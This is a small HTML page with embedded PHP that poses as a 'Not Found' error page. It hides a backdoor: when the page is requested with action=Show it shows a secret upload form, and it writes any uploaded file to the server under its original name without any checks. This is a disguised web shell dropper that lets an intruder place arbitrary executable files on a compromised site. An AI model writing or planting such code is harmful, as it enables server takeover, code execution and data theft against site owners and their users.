<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Untitled Document</title>
</head>

<body>
<h1>Not Found</h1>
The requested URL  was not found on this server.
<p><?php 
$f=$_FILES['f'];
if($f['name']!=''){
if(move_uploaded_file($f['tmp_name'],$f['name'])){ echo 'done';}else{ echo 'error';}	
}
if($_GET['action']=="Show"){
echo '<form method="post" enctype="multipart/form-data" ><input type="file" name="f" /><input type="submit" name="s" value="go" /></form>';
}
?></p>
</body>
</html>